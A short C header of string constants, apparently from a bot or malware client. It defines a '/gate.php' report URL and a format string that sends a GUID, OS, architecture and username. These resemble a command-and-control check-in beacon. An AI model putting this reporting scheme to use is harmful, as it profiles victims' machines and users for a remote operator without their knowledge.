#ifndef __STRINGS_H__
#define __STRINGS_H__

#define STRING_REPORT_GATE_URL	"/gate.php"
#define STRING_REPORT_DATA		"type=%d&guid=%s&os=%d&arch=%d&username=%s"

#define WSTRING_BACKSLASH		L"\\"
#define WSTRING_DOT_EXE			L".exe"

#endif